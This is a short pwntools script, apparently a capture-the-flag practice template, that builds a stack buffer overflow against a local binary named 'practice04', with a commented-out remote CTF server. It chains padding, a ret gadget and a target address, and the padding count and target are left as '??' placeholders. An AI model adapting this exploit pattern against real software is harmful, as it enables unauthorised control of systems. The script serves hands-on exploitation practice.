from pwn import *


proc = process(["./practice04"])
#proc = remote("ctf.sectools.tw",1321)

input("[b4 sending]")

count = ??
ret_gadget = 0x40120b
target = ??

proc.sendline(b"A" *count+
		ret_gadget.to_bytes(8,"little")+
		target.to_bytes(8,"little")
		)
input("[aft sending]")
proc.interactive()
